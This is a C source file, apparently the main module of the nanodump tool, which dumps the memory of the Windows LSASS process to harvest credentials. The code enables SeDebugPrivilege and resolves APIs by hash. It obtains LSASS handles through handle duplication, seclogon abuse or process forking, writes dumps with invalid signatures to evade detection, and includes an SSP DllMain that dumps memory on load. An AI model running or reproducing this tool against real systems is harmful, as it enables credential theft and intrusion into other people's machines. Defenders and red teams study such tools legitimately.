#include "nanodump.h"
#include "common.h"
#include "handle.h"
#include "malseclogon.h"


typedef BOOL(WINAPI* LookupPrivilegeValueW_t) (LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);

#define LookupPrivilegeValueW_SW2_HASH 0x8c8ec318

void usage(char* procname)
{
	PRINT("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
	PRINT("    --getpid");
	PRINT("            print the PID of " LSASS " and leave");
	PRINT("    --write DUMP_PATH, -w DUMP_PATH");
	PRINT("            filename of the dump");
	PRINT("    --valid, -v");
	PRINT("            create a dump with a valid signature");
	PRINT("    --fork, -f");
	PRINT("            fork target process before dumping");
	PRINT("    --dup, -d");
	PRINT("            duplicate an existing " LSASS " handle");
	PRINT("    --malseclogon, -m");
	PRINT("            obtain a handle to " LSASS " by (ab)using seclogon");
	PRINT("    --binary BIN_PATH, -b BIN_PATH");
	PRINT("            full path to the decoy binary used with --dup and --malseclogon");
	PRINT("    --help, -h");
	PRINT("            print this help message and leave");
}

BOOL enable_debug_priv(void)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tkp = { 0 };
	LookupPrivilegeValueW_t LookupPrivilegeValueW = NULL;
	BOOL ok;

	// find the address of LookupPrivilegeValueW dynamically
	LookupPrivilegeValueW = (LookupPrivilegeValueW_t)get_function_address(get_library_address(ADVAPI32_DLL, TRUE), LookupPrivilegeValueW_SW2_HASH, 0);
	if (!LookupPrivilegeValueW)
	{
		DPRINT_ERR("Address of 'LookupPrivilegeValueW' not found");
		DPRINT_ERR("Could not enable SeDebugPrivilege");
		return FALSE;
	}

	DPRINT("Got address of LookupPrivilegeValueW: 0x%p", (PVOID)LookupPrivilegeValueW);

	ok = LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tkp.Privileges[0].Luid);
	if (!ok)
	{
		function_failed("LookupPrivilegeValueW");
		DPRINT_ERR("Could not enable SeDebugPrivilege");
		return FALSE;
	}

	NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtOpenProcessToken", status);
		DPRINT_ERR("Could not enable SeDebugPrivilege");
		return FALSE;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	status = NtAdjustPrivilegesToken(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	NtClose(hToken);
	hToken = NULL;

	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtAdjustPrivilegesToken", status);
		DPRINT_ERR("Could not enable SeDebugPrivilege");
		return FALSE;
	}

	return TRUE;
}

void encrypt_dump(Pdump_context dc)
{
	// add your code here
	return;
}

void erase_dump_from_memory(Pdump_context dc)
{
	// delete all trace of the dump from memory
	memset(dc->BaseAddress, 0, dc->rva);

	// free the memory area where the dump was
	PVOID base_address = dc->BaseAddress;
	SIZE_T region_size = dc->DumpMaxSize;

	NTSTATUS status = NtFreeVirtualMemory(NtCurrentProcess(), &base_address, &region_size, MEM_RELEASE);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtFreeVirtualMemory", status);
		DPRINT_ERR("Could not erased the dump from memory");
	}
	else
	{
		DPRINT("Erased the dump from memory");
	}
}

#if defined(NANO) && defined(SSP)
BOOL NanoDump(void)
{
	/******************* change this *******************/
	LPCSTR dump_path = "C:\\Windows\\Temp\\nano.dmp";
	BOOL   use_valid_sig = FALSE;
	/***************************************************/

	ULONG32 Signature;
	SHORT   Version;
	SHORT   ImplementationVersion;
	BOOL    success;
	wchar_t wcFilePath[MAX_PATH];
	UNICODE_STRING full_dump_path;
	full_dump_path.Buffer = wcFilePath;
	full_dump_path.Length = 0;
	full_dump_path.MaximumLength = 0;

	get_full_path(&full_dump_path, dump_path);

	if (!create_file(&full_dump_path))
		return FALSE;

	// set the signature
	if (use_valid_sig)
	{
		Signature = MINIDUMP_SIGNATURE;
		Version = MINIDUMP_VERSION;
		ImplementationVersion = MINIDUMP_IMPL_VERSION;
	}
	else
	{
		generate_invalid_sig(&Signature, &Version, &ImplementationVersion);
	}

	// we are LSASS after all :)
	HANDLE hProcess = NtCurrentProcess();

	// allocate a chuck of memory to write the dump
	SIZE_T region_size = DUMP_MAX_SIZE;
	PVOID base_address = allocate_memory(&region_size);
	if (!base_address)
		return FALSE;

	dump_context dc;
	dc.hProcess = hProcess;
	dc.BaseAddress = base_address;
	dc.rva = 0;
	dc.DumpMaxSize = region_size;
	dc.Signature = Signature;
	dc.Version = Version;
	dc.ImplementationVersion = ImplementationVersion;

	success = NanoDumpWriteDump(&dc);
	if (!success)
		return FALSE;

	// at this point, you can encrypt or obfuscate the dump
	encrypt_dump(&dc);

	success = write_file(&full_dump_path, dc.BaseAddress, dc.rva);
	if (!success)
		return FALSE;

	erase_dump_from_memory(&dc);

	return TRUE;
}

__declspec(dllexport) BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		NanoDump();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return FALSE;
}
#else
int main(int argc, char* argv[])
{
	DWORD   lsass_pid = 0;
	BOOL    fork_lsass = FALSE;
	BOOL    duplicate_handle = FALSE;
	LPCSTR  dump_path = NULL;
	ULONG32 Signature;
	SHORT   Version;
	SHORT   ImplementationVersion;
	BOOL    success;
	BOOL    use_valid_sig = FALSE;
	BOOL    get_pid_and_leave = FALSE;
	BOOL    use_malseclogon = FALSE;
	BOOL    is_malseclogon_stage_2 = FALSE;
	LPCSTR  malseclogon_target_binary = NULL;
	wchar_t wcFilePath[MAX_PATH];
	UNICODE_STRING full_dump_path;
	full_dump_path.Buffer = wcFilePath;
	full_dump_path.Length = 0;
	full_dump_path.MaximumLength = 0;

	for (int i = 1; i < argc; ++i)
	{
		if (!strncmp(argv[i], "--getpid", 9))
		{
			get_pid_and_leave = TRUE;
		}
		else if (!strncmp(argv[i], "-v", 3) || !strncmp(argv[i], "--valid", 8))
		{
			use_valid_sig = TRUE;
		}
		else if (!strncmp(argv[i], "-w", 3) || !strncmp(argv[i], "--write", 8))
		{
			if (i + 1 >= argc)
			{
				PRINT("missing --write value");
				return -1;
			}
			dump_path = argv[++i];
			get_full_path(&full_dump_path, dump_path);
		}
		else if (!strncmp(argv[i], "-p", 3) || !strncmp(argv[i], "--pid", 6))
		{
			if (i + 1 >= argc)
			{
				PRINT("missing --pid value");
				return -1;
			}
			i++;
			lsass_pid = atoi(argv[i]);
			if (!lsass_pid || strspn(argv[i], "0123456789") != strlen(argv[i]))
			{
				PRINT("Invalid PID: %s", argv[i]);
				return -1;
			}
		}
		else if (!strncmp(argv[i], "-f", 3) || !strncmp(argv[i], "--fork", 7))
		{
			fork_lsass = TRUE;
		}
		else if (!strncmp(argv[i], "-d", 3) || !strncmp(argv[i], "--dup", 6))
		{
			duplicate_handle = TRUE;
		}
		else if (!strncmp(argv[i], "-m", 3) || !strncmp(argv[i], "--malseclogon", 14))
		{
			use_malseclogon = TRUE;
		}
		else if (!strncmp(argv[i], "-s2", 4) || !strncmp(argv[i], "--stage2", 9))
		{
			is_malseclogon_stage_2 = TRUE;
		}
		else if (!strncmp(argv[i], "-b", 3) || !strncmp(argv[i], "--binary", 8))
		{
			if (i + 1 >= argc)
			{
				PRINT("missing --binary value");
				return -1;
			}
			malseclogon_target_binary = argv[++i];
			if (!strrchr(malseclogon_target_binary, '\\'))
			{
				PRINT("You must provide a full path: %s", malseclogon_target_binary);
				return -1;
			}
			if (!file_exists(malseclogon_target_binary))
			{
				PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
				return -1;
			}
		}
		else if (!strncmp(argv[i], "-h", 3) || !strncmp(argv[i], "--help", 7))
		{
			usage(argv[0]);
			return 0;
		}
		else
		{
			PRINT("invalid argument: %s", argv[i]);
			return -1;
		}
	}

	success = enable_debug_priv();
	if (!success)
		return -1;

	// if not provided, get the PID of LSASS
	if (!lsass_pid)
	{
		lsass_pid = get_lsass_pid();
		if (!lsass_pid)
			return -1;
	}
	else
	{
		DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
	}

	if (get_pid_and_leave)
	{
		PRINT(LSASS " PID: %ld", lsass_pid);
		return 0;
	}

	if (!full_dump_path.Length)
	{
		PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
		usage(argv[0]);
		return -1;
	}

	if (duplicate_handle && use_malseclogon && !malseclogon_target_binary)
	{
		PRINT("If --dup and --malseclogon are used, you need to provide a binary with --binary");
		return -1;
	}

	if ((!duplicate_handle || !use_malseclogon) && malseclogon_target_binary)
	{
		PRINT("The option --binary can only be used with --malseclogon and --dup");
		return -1;
	}

	if (use_malseclogon && !malseclogon_target_binary)
		malseclogon_target_binary = argv[0];

	BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
	BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
	BOOL is_malseclogon_stage_1 = use_malseclogon && !is_malseclogon_stage_2;
	PPROCESS_LIST created_processes = NULL;

	if (!is_malseclogon_stage_2)
	{
		if (!create_file(&full_dump_path))
			return -1;
	}

	if (is_malseclogon_stage_1)
	{
		success = MalSecLogon(malseclogon_target_binary, dump_path, fork_lsass, use_valid_sig, use_malseclogon_locally, lsass_pid, &created_processes);
		if (!success)
			return -1;

		if (use_malseclogon_locally)
			return 0;
	}

	// set the signature
	if (use_valid_sig)
	{
		DPRINT("Using a valid signature");
		Signature = MINIDUMP_SIGNATURE;
		Version = MINIDUMP_VERSION;
		ImplementationVersion = MINIDUMP_IMPL_VERSION;
	}
	else
	{
		DPRINT("Using a invalid signature");
		generate_invalid_sig(&Signature, &Version, &ImplementationVersion);
	}

	// by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
	DWORD permissions = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
	if (fork_lsass && !use_malseclogon_remotely)
	{
		permissions = PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS;
	}

	HANDLE hProcess = obtain_lsass_handle(lsass_pid, permissions, duplicate_handle, fork_lsass, is_malseclogon_stage_2, dump_path);
	if (!hProcess)
		return -1;

	// if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
	if (fork_lsass && use_malseclogon)
	{
		hProcess = make_handle_full_access(hProcess);
		if (!hProcess)
			return -1;
	}

	// avoid reading LSASS directly by making a fork
	if (fork_lsass)
	{
		hProcess = fork_process(0, hProcess);
		if (!hProcess)
			return -1;
	}

	// allocate a chuck of memory to write the dump
	SIZE_T region_size = DUMP_MAX_SIZE;
	PVOID base_address = allocate_memory(&region_size);
	if (!base_address)
	{
		NtClose(hProcess);
		hProcess = NULL;
		return -1;
	}

	dump_context dc = { 0 };
	dc.hProcess = hProcess;
	dc.BaseAddress = base_address;
	dc.rva = 0;
	dc.DumpMaxSize = region_size;
	dc.Signature = Signature;
	dc.Version = Version;
	dc.ImplementationVersion = ImplementationVersion;

	success = NanoDumpWriteDump(&dc);

	// close the handle
	NtClose(hProcess);
	hProcess = NULL;
	dc.hProcess = NULL;

	// if we used MalSecLogon remotely, kill the created processes
	if (use_malseclogon_remotely)
	{
		kill_created_processes(created_processes);
		created_processes = NULL;
	}

	if (!success)
		return -1;

	DPRINT("The dump was created successfully, final size: %d MiB", (dc.rva / 1024) / 1024);

	// at this point, you can encrypt or obfuscate the dump
	encrypt_dump(&dc);

	success = write_file(&full_dump_path, dc.BaseAddress, dc.rva);
	if (!success)
		return -1;

	erase_dump_from_memory(&dc);

	if (!is_malseclogon_stage_2)
		print_success(dump_path, use_valid_sig, TRUE);

	return 0;
}
#endif
